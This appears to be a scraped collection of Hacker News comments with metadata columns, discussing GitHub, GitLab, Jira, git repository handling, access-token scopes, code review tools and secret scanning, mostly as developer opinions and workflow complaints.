I'm talking `-AdF --window=500` or somesuch.  On $dayjob's repository, the base checkout is several gigs. Aggressively repacking it reduces its size by 60%.There's also a git-level thing which would greatly benefit large repositories: for packs to be easier to craft and more reliably kept, so it's easier to e.g. segregate assets into packs and not bother compressing that, or segregate l10n files separately from the code and run a more expensive compression scheme on that.	masklinn	8.580341	-6.423541	comment	4.0	41.0	1615920978	-11.867834

So instead of us moving our own work along we had to queue it up and wait for an hour long meeting where we waited our turn to tell the TPM which tickets needed to be moved, then sparred with him in debate for 5 minutes as he tried to debate the done-ness with us through a game of 20 questions.Repeat those meetings 3X a week and I developed a visceral objection to Jir	Aurornis	7.980008	-5.7661347	comment	4.0	19.0	1695303084	-12.417197

Obviously we still dedicated time as a team to prune through our repository history with a fine-toothed comb for anything that could potentially be a vulnerability, as we take this very seriously.One of our engineers came up with a useful script to grab all unique lines from the history of the repository and sort them according to entropy.

First, make sure the intent of your change is actually desired. Just because someone opened an Issue does not mean that it belongs in the project. Anyone in the world can open a Github Issue for any reason. Instead engage and discuss the Issue first and make sure it's actually something the project wants.Don't just start writing code. Familiarize yourself with the codebase. This comes naturally if you are a user of the project, as you will naturally run into bugs or learn the software's behaviors and as you discuss the Issue or features with maintainers.

And this site (""GPL Hub?"") just links to all the places that are hosting their own version of {bash, etc.}.

For a tool I use multiple times per hour, ""free"" doesn't matter much to me. Github isn't perfect, but it's damned close.As far as Jira -- the tool itself isn't bad per se, but the way PMs turn it into their own little power-trip kingdom irritates me. There's so much focus on 'control' that I feel like a victim every time I use it.

In my opinion, they really need to focus on recruiting top talent, with domain expertise.They (GitLab) need to convince those that would work for Microsoft or GitHub, to work for GitLab.

Placing names and initials in the liveblog makes it look like SOMEONE is trying to assign and pass off blame, even if that is not what is happening.Presumably in the coming days there will be a number of team meetings where you discover what went wrong, and what the action items are for everyone moving forward.

Or use any of the strategies that git supports for interacting with remotes.So GitHub chose a great decentralized tool as their foundation, and then got the community UX right.

Gitlab has built-in CI, so that can be used exclusively there, and it will be one incentive for users to come to a project's Gitlab instance instead.Personally, I like hosting a repository on Github plus Gitlab for availability reasons, but if Github would finally allow disabling pull requests as well, one could easily make Github a read-only mirror.In light of non-existence of project patch, ticket, release, wiki interoperability protocols, we will either adopt more of FossilSCM's features into git addons (like git-appraise) or someone will write adapters.The most concerning aspect of all of this is that projects that have access t	cm3	8.324781	-6.3443747	comment	4.0	21.0	1471784957	-11.954553

If you don't believe me, try firing up a screen reader and see which you find easier to navigate with your eyes closed. In some cases you'll run smack into a brick wall with GitLab. So if there's one area where massive improvement is needed (and would be appreciated) it's accessibility.

But then I have to spend another 5 minutes going on GitHub, forking the repository to my profile, going back into my shell, changing the URL for origin, pushing the change, going back to GitHub, creating the pull request on the project, and then going back to my profile and deleting the fork that I have no interest in maintaining. This should be so much easier.That being said, I run Gitlab under a small docker box and I couldn't be happier with it. It's so darn easy to setup.

My favorite is the checkbox the QA team has to click to confirm that they've done security checks on new endpoints.

But PATs have no repository scoping whatsoever, it's all or nothing. So although both PATs and GHA Tokens have these complex scope requests, it's completely missing the most basic use cases in my opinion, like creating a PR in repo X, allow installing a package from GitHub Packages in repo Y, check out code from repo Z etc. You either go full mono-repo for everything, or you use PATs for everything wit	Androider	8.498571	-6.2037544	comment	4.0	17.0	1628804021	-11.780195

In particular how easy they are to identify and prevent leaking (easily fixed by adding a prefix).I work on secret scanning at GitHub. When token issuers use easily identifiable formats for their tokens we can easily spot them when they're accidentally committed. We can then work with the token issuer to automatically alert them of those leaks. A good example is AWS - if you commit an AWS key and secret to a public GitHub repo we will tell AWS about it and they will tell you about it (and quarantine the exposed keys) within a few seconds. We work with dozens of other token issuers too, though - some of the latest we added were Linear, PlanetScale and Ionic.The above relies on tokens being id	greysteil	8.541808	-6.182819	comment	4.0	31.0	1629847188	4.3922086

Centralization at a proprietary vendor, instead of open systems interacting. Then locking people in further by network effect and adding centralized products around git. That it's become so popular many people equate GitHub with git adds insult to injury.I completely understand why this all happened (centralization is just so easy and convenient; federation is hard), and it was probably inevitable in its timeframe, but I also wish it wasn't so.

If I host critical code somewhere, it has to be available, and GitLab's uptime history[0] is so much poorer compared to GitHub's[1], with service disruptions and degradations being more common, and far more severe.

He was really pissed off when I categorically rejected the request and asked him to break it up into manageable pieces.Quite sad because obviously he put a lot of effort into it but he did not keep in mind that it's one thing to do this, it is an impossibility to actually review it.When coding keep in mind the job of the people coming after you: review, QA, eventual long term maintainers and so on.	jacquesm	8.6674795	-6.233998	comment	4.0	38.0	1511624818	2.202993

You can also learn a lot from looking at other peoples changes.2) Faster. To check out the source code for the project I now work on takes an hour in the distributed system, while it only took 5 minutes in the centralized system.3) Always backed up. All code that is checked into the central repository is backed up.

GitHub Enterprise doesn't seem to have much of any cross-repo tooling, which is one of my least favorite things about it.Global refactoring seems a lot less necessary if you have clean separation among your processes. Maybe this is me coming from a more microservices perspective, but I'm inclined to say that needing to do a refactor that cuts across several different functional areas is a sign that things are becoming hopelessly snarled together.	bunderbunder	8.50161	-6.394542	comment	4.0	16.0	1512920153	13.7950535

Fees start in a tier, at 50%. Others like Creative Market are better (30% flat), but still seems excessive. I did a whole lot of spreadsheet math and determined 18% is more than fair for both creators and the company.2. Engineers: do you like downloading Zip archives to get updates? Me either.

The original open source (SCCS used to be proprietary) RCS tool that predates CVS (CVS was built on top of RCS) was meant as an alternative to SCCS, with similar functionality.SCCS was horrible, even by CVS standards. I had the ""pleasure"" of using this on HP UX back in the day and it wasn't fun at all.* File oriented, there is no concept of an atomic commit, change set or anything similar, every file is independently tracked - so your commit may fail halfway (e.g. because of a conflict) and the repo is left in an inconsistent state, with some files having their changes applied and some not. RCS and CVS have inherited this wonderful design trait too. One of major Subversion improvements over CVS was introduction of atomic commits that either"	janoc	8.714702	-6.4220552	comment	4.0	13.0	1541246487	-11.764359

For the most part nobody cares if the data is hosted on a distributed system or a centralized one, because the overwhelming majority of users will rely on the front end.

For example: authordate >= ""2017-09-01"" AND authordate < ""2017-10-01"" AND authorname = ""John Smith"" AND parentcount < 2.- View layout is more flexible. Each tab in GRV can have any view added to it as a vplit or hsplit. Users can create their own tabs and populate them with any combination of views they want. The long term idea is that when GRV supports more views (tree view, file view, etc) it will be possible to create quite a custom experience."	powerage99	8.595822	-6.43227	comment	4.0	16.0	1517436988	-11.863798

If they can do this through both Windows and the Windows Subsystem for Linux then I think they'll be on to a winner. It's a capture of a much-loved service, and an opportunity to bring a mature set of tools into their domain.	EnderMB	8.45599	-6.1467977	comment	4.0	157.0	1528065423	-11.727059

At the moment, a personal access token does have scopes, but it is quite limited:- Repo access is all or nothing. A read-only token is not possible, an 'issues-only' token is not possible.- Personal access tokens are not scoped to repositories or organizations. So your personal toy project token also allows access to your super-sensitive employer's repository. On top of that, your employer is unable to prevent this, unless you start using Github Enterprise _and_ an SSH CA, which is far from trivial.It's nice that they drop username/password access, but as long as personal access tokens have such broad permissions, it does not really add any value (you should have been using  2FA anyway).	miken123	8.494141	-6.1897597	comment	4.0	14.0	1586705440	-11.785128

I've never managed to ""convert"" so many people to something so easily :)However, I'm wondering if anyone on here has become, or works somewhere that has become, a customer of 8x8 [1], the company behind it [2]? They supposedly support Jitsi primarily to 1) get contributions that also make their product better and 2) to advertise their product. I'm somewhat worried about whether 2 is working, and hence whether Jitsi will continue to receive their support.(I'm not affiliated or anything btw, just a happy Jitsi user.)[1] https://www.8x8.com/[2] https://jitsi.org/user-faq/"	Vinnl	7.9917808	-5.719705	comment	4.0	12.0	1586785224	-12.344591

They have some amazing features but I can't get past how many (2-5 seconds) to load a page and sometimes upto 10 seconds (analytics). I hope that's being addressed in future. Usually, I spend at least 2 hours on Github in a given day - and probably access the website about 50 times a day or more.

As a technology, OAuth uses scopes to grant permissions. You mentioned that you didn't read the permissions before granting access. An app that requests zero scopes is still safe, as it can't star repos for you, but the burden falls on you to read. This is inherent to the design of OAuth.There is a problem with GitHub scopes being overly broad, and users can't audit what an app actually does with those permissions. GitHub and others should be policing apps that request unreasonable permissions.	8organicbits	8.497092	-6.1604156	comment	4.0	14.0	1681197836	-11.773929

Not only because it's a horrible file format but also because it lacks proper variables, proper type safety, proper imports, proper anything. To this day, usage & declaration search in YAML-defined infrastructure still often amounts to a repo-wide string search. Why are we putting up with this?- The purely declarative approach to infrastructure feels wrong. For instance, if you've ever had to work on Gitlab pipelines, chances are that already on day 1 you started banging your head against the wall because you realized that what you wanted to implement is not possible currently – at least not without jumping through a ton of hoops –, and there's already an open ticket from 2020 in Gitlab's issue tracke	codethief	8.439472	-6.423472	comment	4.0	14.0	1689961024	4.222041

You have the main product, with the main team, that probably understands things like how they use tokens for CI pretty well.   Then, as the product grows, you get satellite teams to work on features outside the core.  Things like this SAST analyzer, GitLab pages, Gitlab Wiki, etc.  They don't have the same deep understanding of the core product.  So they probably do a lot of trial and error until something works.So I guess one lesson for the main product team is that they need to expose apis and data to these peripheral product teams as if those teams were a t	tyingq	8.319972	-6.3373523	comment	4.0	16.0	1695122159	-11.889987

It lets you more easily see how  development evolves in response to feedback. And the final state of the branch which gets merged leaves all the in-progress work that no one cares about behind only in Gerrit.With Github/lab's model, if you force push your PR, you lose the ability to view its previous state and diff against that. Alternately, if you just keep adding commits, then the final branch that gets merged (unless you squash) has all the in-progress work which pollutes the repo's history.Gerrit also has a finer grained permission model, but I don't care as much about that.Gerrit definitely expects the user to understand how git works conceptually a bit more than Github/lab.	js2	8.549596	-6.4253078	comment	4.0	22.0	1603898750	-11.930139

But some coworkers helped me get the confidence I needed to go open source (within the company, not public internet).

I resisted this idea because I, the relatively inexperienced manager of a nascent team, was daunted by the prospect of trying to supplant Jenkins, Github, and JIRA all at once.I think this is a really big scoping mistake. There is a clean glide path, and I have no idea why you'd think you need to replace Jira.You can use Gitlab Runners in Github (https://docs.gitlab.com/ee/user/project/integrations/github....). Then with your mirrored repo you can try out the Gitlab features and realize it's better to use Gitlab for your repo if you're aso using it for CI. Having switched back and forth over the years (with tens of engineers using the repos), it's really not a lot of work to migrate between Github and Gitlab.Finally, if you like Jira, just use that? 	theptip	8.324233	-6.370379	comment	4.0	22.0	1701625426	-11.993133
38519157	Satisfaction with Critique among Xoo	Satisfaction with Critique among Xooglers is undoubtedly driven by dissatisfaction with GitHub PR reviews. GitHub reviews are astonishingly bad. The tool is utterly useless for actual reviews. After the first round of comments it becomes total chaos. Nobody can tell what's been said, done, changed, or resolved. It is impossible to believe that the people who write and maintain the GitHub PR tools have themselves ever practiced code review.	jeffbee	8.497102	-6.246505	comment	4.0	17.0	1701706813	2.2560515

Many of the features of Critique that developers enjoy have been included in our first release...
- A focus on only the latest changes
- A familiar, side-by-side diffing interface - show 'diff from the last review' by default

Sometimes mixing the two in the same repository. In the main gitlab repo, there is also some unvendored js dependencies for the frontend, necessitating to jump through some more hoops.Gitlab has a bunch of hardcoded paths to logfiles and config files. Some config files are toml, others are yaml. Different services need different configs, sometimes duplicating the config entries in a different format.I love gitlab as a product.

The worst was restarting upon upgrades: Easily 3-5 minutes per instance, which, at scale, was a huge burden.After rearchitecting around services, pieces could be restarted and upgraded independently. As a customer, we didn't notice differences in the UI (e.g. the file storage on AWS).Epilogue: They had a shared login system, multi tenant and all... which they recently replaced by a third party.

So if we are to embrace GitLab further we must abandon the idea of letting the whole company use GitLab freely and limit it to devs only.Being small doesn't mean that we are not in need if advanced features, we just have a smaller scale.Also as our initial tier was the top tier, and now is the bottom one, I fear GitLab will fence off future functionality with even more tiers at random.Further, the tiers creates some artificial barriers"	tyldum	8.295205	-6.372951	comment	4.0	22.0	1532346918	-11.995499

It was a tool that actually helped development, especially with the GreenHopper pluginNow almost the entirety of its functionality is to help various middle managers track things that are important to them, while continuously making development slower. Manager 1 wants to track Metric A? Add a drop down. Manager 2 wants to track Metric B? Add a new form to fill out. And tie them all together with workflows so that you can't do your work and mark it as complete until all the boxes are checked and fields are filled.Those that haven't experienced this probably just haven't worked in a medium or large corporation.	strictnein	7.9839897	-5.767394	comment	4.0	15.0	1532638035	-12.4217415

Setting up a test build for PRs on a .NET Core solution took ~10 lines of YAML, and we were in business. The ability to monitor the builds in real-time as well as link to specific line #s in each respective action log is an incredible feature. We will definitely be using this to link issues to build failures. Also, the ability to see how a build script will perform scoped to its PR means that you can review and approve not only the code aspect, but also any required changes to the build/deploy pipeline.

However, since the HEAD response doesn't have valid CORS headers, you can't read the 'code' parameter from the HEAD response.3. To get around CORS, the proof-of-concept redirects the user to the same OAuth url again.4. Since the user has already authorized the scope (from the previous HEAD request), Github automatically redirects back to the redirect_uri (the proof-of-concept page) with a new 'code' that the author can then use.So I have two questions:a) If I have 3rd party cookies disabled, will the ""credentials: 'include',"" part of the ajax HEAD request still work?b) Why does Github automatically redirect back the 2nd time without asking the user to authorize again?

The worst they can do is reject your changes, in which case...well, you're using your fork anyway.[0] Github forks are lightweight, easy(ish) to keep up to date, and integrated into a lot of package managers.	strken	8.539625	-6.215832	comment	4.0	29.0	1655632322	-11.736406

In my gut feelings, this software shall be used by at least 10x Engineers compared to the number who may actually help code it. So, there must be a way for those Users to contribute back to the project. Even if it is simply improving the docs. If I use a static site generator such as Hugo to generate the docs (EDIT: user manual in our language), there must be a way for users (not developers) to submit correction/updates to the docs. I can't expect them to create a GitHub issue either, so I have to think about a way to do this. i.e. In this case, non-code contributions are far more important than the actual pull request.	ramshanker	8.537654	-6.1674294	comment	4.0	15.0	1707833052	-11.7990055

I agree with the parent that “everybody” hates Jira because “it’s too complicated” — yet when developers try to use a lean, simple tool like Pivotal or Trello, inevitably other stakeholders demand something better for business users, these simpler tools can’t deliver that, and the replacement ends up being Jira 99% of the time. I’ve started tech orgs on multiple issue trackers and this plays out every time.Also, I hated Jira before learning a lot of its features and how to use them, getting frustrated that everything is not just a setting, but something meta where you need to adjust a “scheme” and understand how it works with the other data objects in the system.

Since most of the organisation are looking at Jira, the effective source of truth becomes Jira's current state, and the developers end up running to try and keep the actual project in sync with Jira.

Atlassian is an Australian company, and has generally inherited such an approach, so there's little tolerance for putting extra effort into things like adding the finishing touches to markdown parsing or improving performance (or even preventing it from regressing).	logicchains	8.049257	-5.784869	comment	4.0	12.0	1685525732	-12.311315

Their chat tools are way better than Google Chat / Microsoft Teams (not sure how it stacks up against Slack since I'm not a huge user of them).I agree the observability tools I interfaced within Meta was subpar a few years ago, but I think you're being ungenerous to take that and extend it to the coding tooling specifically.	vlovich123	8.50045	-6.2579913	comment	4.0	18.0	1687986332	-11.799972

This matters a lot because community is great power, whoever holds it, holds key to future mindshare.I want GitLab to be a larger part of the developers mindset everywhere, but I am not sure that is happening at the moment.

It's unclear how all these other services will ever compete with that.For example, to run a CI server on Gitlab for a team of 8 that never spun down, it would cost $492 per month on their 'shared' runners.

I'd argue that GitHub's behavior here isn't a power grab so much as a reflection of reality.The ""real"" lock-in is with the discussion model — on both issues and pull requests — and the organizational structure you're able to set up.

This doesn't affect existing filters, which you have to manually fix.In true Jira fashion, if you try to reassign a filter after flipping this setting, it will deny the operation and ask you to edit the ACL, which there is no convenient admin UI to do.Jira is a disaster of UX."	mik3y	7.9863877	-5.7638865	comment	4.0	33.0	1564785740	-12.411123

My opinion - it’s both.The product has a ton of permutations, as you said, which makes stuff like this happen: Customers who never in the world imagined public issue tracking, suddenly bit by a feature they didn’t even know existed. Conversely I’m sure there are shops, who love this feature, for whom the distinction between “Everyone” and “Open” was always obvious. I don’t envy the team building / supporting the product across all that; I don’t know how I’d do it.But there are also endemic, continuously-poor design choices large and small.

This benefits everyone.

The idea of the pull request formalises the process of emailing Linus.In the late 90s and early 2000s, most projects had their own CVS server and mailing list.

There could be PRs that are behind a paywall and someone would have to pay for the contribution so that it can be merged; and ban 0$ dollar PRs.The fact that someone can come into my open repository and tell me something completely orthogonal to it is an ""issue"" makes me vomit (and this basically reveals the whole sham of GitHub).

(Not running hooks, or allowing operations that would trigger them, from non-owned directories would preserve some of this usage, and still at least mitigate the dangerous cases somewhat.)It's also not entirely clear to me what this does to site-wide shared remotes, though I suppose if they can be listed in system config, it's at least not a per-user hassle.	rst	8.527257	-6.3444314	comment	4.0	19.0	1649812884	-11.831349

If it's a relatively concise library I would much rather it use a trustworthy service to host its documentation as opposed to some custom domain that's likely to expire and break links in the future.(My own open source projects now mostly hang off my https://datasette.io/ domain, but I was a few years into that project before I committed to a domain name that I plan to renew for the rest of my life.)	simonw	8.462409	-6.1651664	comment	4.0	39.0	1653457610	-11.840705

The repositories themselves contain so many email addresses that are otherwise hidden from the platform. In a recent test of mine, out of 60 people that had their contact email hidden in their profile, I could still determine it by looking into commit authorships in at least some of their repositories. Why is noone targetting these? These are all active and often personal accounts, meant to not be discoverable.IMO there's also no point in remaining silent about this, it's only a matter of time until the spam starts coming in over this channel. I'm pretty certain some day GitHub will cloak commit emails by default.	phil294	8.486622	-6.204897	comment	4.0	20.0	1654425499	-11.816643

I pretty much just want the parts you’d get in gitweb or cgit, but done better (since neither of those is very good; I run gitweb because I wasn’t impressed with either, but gitweb was easier to patch into a more acceptable shape).

29230695	It's really neat that ssh keys can b	It's really neat that ssh keys can be used for signing commits, but I'm not a big fan of this.When auditing a source repository you want to see how commits are signed over time. In other words you have a key X which is valid at time Y. As Y changes, key X will change as well. To audit a repo, you need to know the history of what key X was valid at time Y.With GPG you can set up a hierarchy of commit signing keys which have defined lifetimes and are all subordinate to a master key which you do not use for signing (and hopefully keep somewhere secure). One irritant is that the major git-as-a-service products, i.e. github + gitlab, do not respect the use of GPG keys as something varying over time or subordinate to a master key.

Obviously you would compress the tar (normally) with lz4 or zstd or similar, using this approach you should generally see a reduction in total time to get and unpack the cache. node_modules even more so since it generally has zillions of small files, so the unpack time can be quite high.Be nice if gitlab supported this approach OOTB.Edit: An even better way if your environment supports it is to use a moun	nhoughto	8.332089	-6.395101	comment	4.0	20.0	1639095937	-12.012206

For URLs of specific change sets, they should never be corrected again and an infinite cache is pretty much valid unless a user overrides good git practices.I think GitHub frequently misidentifies which scenario they are in and when they return 1 day for a current state URL users notice, while when they return 5 minutes for a permanent change set that gets a lot if traffic they lost network capacity.	roundandround	8.524087	-6.284127	comment	4.0	19.0	1676202256	-11.827569

I guess nobody is ever happy to pay more, but gitlab was already more expensive than github.More staggering is that there's no discount pricing for self-hosting your gitlab instance, so you may as well use Gitlab's resources on the SaaS platform, which is more expensive for gitlab themselves -- yes, annoyingly, storage over a certain volume is an additional cost, but you'd pay it anyway if you self-host, so whatever.I know there's a lot of features that I don't use and that I begrudge paying for, ju	dijit	8.305166	-6.355872	comment	4.0	15.0	1677783382	-11.969242

What one CEO does, another can undo. GitHub's bus factor is now 1.I would much rather have seen them go public. They were losing money, but not, last I saw, at a rate that was absurd for building a SaaS business. Is there some reason to think they couldn't have gotten into the black? And if so, is there some reason to think Microsoft will let them burn cash forever without getting anything valuable in return?Previously, GitHub's success depended on GitHub serving their customers and users. Now it depends on the notions of some guy in Seattle. Some guy whose job is, at least by market cap, 99% focused on other things.

I started this project in 2015, using Bitcoin and BitTorrent -- since then, I think Ethereum and IPFS have become better substrates for this sort of work.And, I think it remains the case that the difficult part of decentralizing GitHub is not working out how to share repositories using p2p bandwidth, but instead working out how to use p2p for the social features of the site, like comments and pull requests.Secure Scuttlebutt has some potential there, but as a gossip protocol it doesn't have a way for people you don't know/follow to e.g. send you a PR.	cjbprime	8.519637	-6.2563186	comment	5.0	19.0	1528175684	-11.814839

Investors were in this for a huge exit and they just got it. In fairness, MS bought a valuable social network of essentially the entire OSS and developer community.As an independent entity, Github would have had to evolve in a very different way and gone more aggressively after making money, fixing their cost structure, like most of their competitors like Atlassian, Gitlab, and other companies selling developer tools as a SAAS service.

Some ways this could be reconciled:- greater end user customization of the UI layout- an option to enter a different UI(contributor UI) for repositories you contribute to/own- make the contributor UI an enhancement on top of the current UI(perhaps a new darker tab bar)- related to the above, separating out the discovery part into a separate appIn general, I am in favor of greater customizeability in my professional tools, especially something I use as much as Github.

The GitHub employees are in semi-revolt because they think Nat is integrating too fast with MS. Many people have quit or are being pushed out. It may actually be for the best because the post-founder/pre-buyout team was pretty mediocre. Nat is also trying to crack down on some of the more overt activism in the company. They do “eq” screenings for political fit during the interview process and he’s trying to get them to stop. They also have a brand new head of product and engineering. Product was taken from Jason Warner about two months ago and placed directly under Nat. Sounds really bad and I don’t expect much turn around.	msghacq	8.464259	-6.16078	comment	5.0	32.0	1552408200	-11.793497

Repos that aren't just forks. I've seen plenty of profiles where the majority or entirety of repos are forks. Unless there's some annotation that talks about contribution to those projects, I assume that those forks don't contain any actual development.2. Code past the boilerplate.

I don't understand their priorities. There is to date still no way to restrict visibility of work-logs on issues - a usecase basically every smaller shop has because the client is often participating directly in the JIRA. Service Desk solves that problem but it's quite expensive and you can't mix software projects with service desk projects. So you have to create linked-issues and have yet another layer of indirection :/We end up syncing projects with another plugin on the same instance :/Confluence lacking some robust text-only markup (like markdown or asciidoc or whatever) is also more than lame.	nisa	8.167521	-5.8986487	comment	5.0	25.0	1552946549	-12.141376

So what does GitHub really offer that makes it so popular? A friendly name?

It's absolutely fine to create a git hosting solution specifically for open source as open source is itself a very big tent spanning a wide range of ideologies and groups that are otherwise hostile towards each other.It is in fact commercial closed source software that is increasingly subject to political restrictions that are justified by supposedly making the world a better place.	fauigerzigerk	8.433728	-6.0970135	comment	5.0	27.0	1680876228	-11.792911

And no, ""epic / ticket / checkboxes in task"" is not enough, that's barely two and a half levels. Compare with https://en.wikipedia.org/wiki/Work_breakdown_structure [0].- Issues are independent.

It’s not uncommon for an engineer to build up ~20 branches over time and multiply 20 by, say 5000 engineers and that’s 100,000 branches.  Git just won’t be usable.  To solve this, we built a feature we call “limited refs” into our Git service (Team Services and TFS) that will cause the service to pretend that only the branches “you care about” are projected to your Git client.  You can favorite the branches you want and Git will be happy.This is almost certainly a result of trying to have one company-wide monolithic repository that holds the source code of hundreds or thousands of separate projects.Git is more pleasant when you break your codebase into isolated components.

22868756	Hi Nat, with Microsoft now owning Gi	Hi Nat, with Microsoft now owning Github, I'm really curious to know what the future holds for both Azure DevOps and Github?I'm a user of both - Github for OSS, and Azure DevOps for private work. IMO, these areas are where they are best suited - pipelines in particular are really powerful in Azure DevOps, and user/permission management, AAD integration and integration with build agents are all excellent.I really like Azure DevOps, but all this has me worried about it's future - do you know if it's going to continue to exist and be developed in tandem with Github?

Jira isn't inherently a better or worse tool than most others out there.If you're at an org where it feels like Jira is holding you back, and you don't see the org changing tools in the near future, the best thing I can recommend is to bring in an external team to show the org how to clean it up.Feel free to ping me if you need help (info in profile)"	bberenberg	7.985993	-5.766935	comment	5.0	29.0	1588279048	-12.39782

The first obvious one is a way to Diff a recipe and it's Forks (unless I missed that).The harder and maybe more important one, is an issue that GitHub itself still hasn't figured out how to solve either. There should be a process for a fork of a recipe being able to explain why it is better than the original, and have the fork be able to be voted on so that the 'best' fork as voted by the most users becomes the canonical 'Chicken Noodle Soup' recipe, or at least display the forks on main recipe ranked by popularity.

They're the best open source reference for how to ship on premises software I've seen, and I frequently refer people to them as an example. You may not like their compensation structure, but they have certainly been quite transparent.If we want to see more companies build around open source and bring transparency, a small touch of forgiveness is probably worthwhile.

We just created a dataset of code snippets crawled from popular GitHub repositories, listed by language, license, github repo, and commit hash and are looking to release it publicly and keep it up-to-date with our GitHub crawl.The dataset for a single crawl comes in at about 60GB. We uploaded the data to Kaggle because we thought it would be a good place for people to work with the data. Unfortunately, the Kaggle notebook experience is not tailored to such large datasets. Our dataset is in a SQLite database. It takes a long time for the dataset to load into Kaggle notebooks, and I don't think they are provisioned with SSDs as queries take a long time.

It's really easy, and it really underscores how simple it is to have your repo distributed without any 3rd party infrastructure.

If you click the edit button, it does a full page load (instead of doing it using ajax) and the page takes a few seconds to load. So trivial things like fixing the title because of a typo or changing the assignee are actually quite painful.

Microsoft seems to be doing the same with Github that it did with Minecraft: amplifying what it does well, fixing what it didn't, and making it more accessible to more folks the way they want to consume it — all while not compromising what made it great to begin with.	frankcaron	8.468575	-6.17799	comment	5.0	21.0	1592402154	-11.794491

The really ugly and depressing thing is that F/OSS projects seek networking effects on GitHub, turning a super-powerful and easy dSCM into a centralized hub in a heartbeat; to me, they kindof devalue their own (massive) work by trading it for only the attention value it gets on GitHub, and contributing to the oligopolistic web.

You can always chase it with a cleanup commit of your own.It's up to the PR's author to decide if they care enough to do better next time.  By accepting their work and landing the change you've demonstrated an appreciation for their effort with open arms, and I feel this makes it more likely they will contribute in the future and care about doing better.Maybe make a comment to that effect before merging as-is, creating the opportunity to clean it up themselves first.If it's coming from a regular contributor I'm far less charitable, this approach I mostly reserve for first-time/infreq	pengaru	8.672579	-6.3922915	comment	5.0	25.0	1651422159	-11.795321

Jira does not make you create 20 boards and per default a Title is all you need to create a Ticket. By the complaints own wording they had 2000 tickets because management refused to delete outdated and irrelevant tickets.A new tool would not fix this since I would bet that management would insist that all 20 boards with all tickets in the backlog would need to be transitioned to the new tool.

This was before they had even made any real code changes. It really turned me off; I don't want to be dealing with a project that uses a CoC as a weapon. I don't know if the situation has changed or not, but if that kind of thing worries you, then I suggest looking into it before going all-in on Forgejo.	dave78	8.326206	-6.331292	comment	5.0	35.0	1708090445	6.0292616

That mismatch cannot be fully resolved (branches vs. patches) and results in constant friction, and you end up trusting a third party with full control over your repositories and approval workflows.Graphite is the best attempt I've seen so far, but it still doesn't come anywhere close to Gerrit[2], which simply uses plain Git commits.

Protesting that a company uses RDS instead of their own hand-rolled Postgres setup? Because this is the same level of stupid.	jamiequint	8.281378	-6.3655477	comment	5.0	27.0	1572393177	-12.000674

But I wouldn't say that it is no longer a problem with VCs, many still have scaling concerns.As one of the best investors said that passed on us: we're in the pattern matching business and all remote doesn't match the pattern.

Apart from that, I don't think I can provide any other guarantees. No open source project can. If they are discovered doing something bad, they go rekt. That's how it usually is. So what's the point here? Should I not have a line like this in my copy?Another thing that can be done is that I distribute my application in such a way that its code is directly linked to the open source GitHub repo. It can be done by having some script as the distributable that clones and runs the source code (it's a very bad way though). It would be interesting to know if any other open source project in the privacy space is already doing something extreme like that.	aviaryan	8.52369	-6.0572004	comment	5.0	25.0	1545229823	-11.733176

This has saved my life many times when trying to figure out how to configure Java frameworks to interact with each other.When searching for this kind of code, you have to wade through an awful lot of repos containing half-baked personal projects, experiments, unmodified clones of upstream frameworks, and barely-modified boilerplate examples. It would be nice if there was less of this detritus clogging up the search results.However, sometimes the code you actually want is embedded in some otherwise useless, half-baked personal project, or barely-modified boilerplate example.

They also immediately reduce the long term burden and ""ownership"" of the code, and for the trusted committer, massively reduce friction and any sense of gatekeeping in contributing to the project.

For example, in the before, why is the number of jobs displayed next to the MR, and then the MR is displayed again further down?They're also often unnecessarily explicit: spelling out ""3 minutes, 12 seconds"" instead of ""3m 12s"" and using full sentences instead of definition lists."

It’s the least dev-friendly way possible to get insight into what’s happening with a Jira story.

Behind the bombast, the author assumes that the purpose of subtasks is to provide micro-level insight on progress to PMs.  I agree that this would be a misuse of subtasks.

Microsoft has really been trying to change their identity from being a stuffy close-source corporation to an open company that developers can rely on. And they have done pretty well at this. They open sourced .net, run MS SQL on Linux, and have released the WSL (which would have been unfathomable a decade ago). They also moved their VCS over to Git for Windows development.GitHub, however, has a business issue of not making money.

The contribution graph looks pretty -- but what if it could be a souvenir? A lot of programming projects are hard to quantify in terms of success -- besides shipping the product, it's hard to see visible signs of bug reporting, refactoring, etc.I'd love to see GitHub selling physical tokens that measure this. She did a fantastic job with this project -- but applying it to a commercial side as part of the shop would be cool. I'm not sure how well anything like this can scale, though.I'd also like to see more exploration beyond the contribution graph for measuring impact. I know it's not perfect, but it is neat.

The best thing about Trello is when you start organizing your board one way, then organically drift towards a more natural way to organize them, sometimes without noticing as you do.

28266035	To be clear on what this is, it allo	To be clear on what this is, it allows you to mount a git repo and use writes to the filesystem to autocommit and push to the remote, effectively using git and a server to synchronize directories between remote hosts.That is not the same thing I would think of as a version-controlled filesystem. That would be something more like the ClearCase MultiVersion Filesystem, which allows you to define versioned views of an entire filesystem. This gives you the holy grail of versioning, snapshotting, backup, restore, synchronizing entire systems, with equal treatment of text and binary files, in a way that is totally transparent to any higher-level tooling that reads and writes to these files, that developers have been trying to reinvent for 30 years because ClearCase is proprietary and very expens	nonameiguess	8.62287	-6.4348254	comment	6.0	21.0	1629644581	-11.86831

Most of these are redundant and could/should go away with either a redesign or a working caching scheme. This issue is more than obvious on platforms (e.g. some macOS versions) where fork/vfork are not as fast as one would expect. I like the paradigm behind magit, but the implementation leaves a lot to be desired. So the pig in this case is definitely not Emacs.Example:  # Doing a simple magit refresh results in the following processes being spawned (tracked with dtrace)

What if you have tests that matched on a hardcoded random number in a SSN-like format. If GitHub scrubs that then suddenly your CI tests might not pass.

When you're a middle manager at a decent sized company, a major problem you face is that the mass of knowledge workers beneath you are opaque: you have no way of knowing whether they're working or not. Another problem you face is that they're uppity: people who went to college and got used to managing their own time now have all kinds of idiosyncratic ideas about how to manage their own time and arrange their own working lives. Since you are a  middle manager you despise local differences. Since you are a manager you're pretty sure that only you and your lieutenants can be trusted with this kind of decision making power. Adopting JIRA is a powerful level to put people back in their place as work item churning machines.	closeparen	7.978194	-5.766859	comment	6.0	52.0	1649870686	-12.432569

The fix is easy, just restart the daemon, but still. Even managing a server may not be a trivial task depending on the available competency in the organization.Upgrades and backups are way more problematic. A while ago I discovered that backups broke and I had to fix it. I setup automatic APT upgrades for Gitlab, but every few major versions or so a manual upgrade process is required. In an organization where people are less vigilant, and/or haven't setup monitoring of backups, this can easily lead to a disaster down the road.None of this is particularly hard — for me.

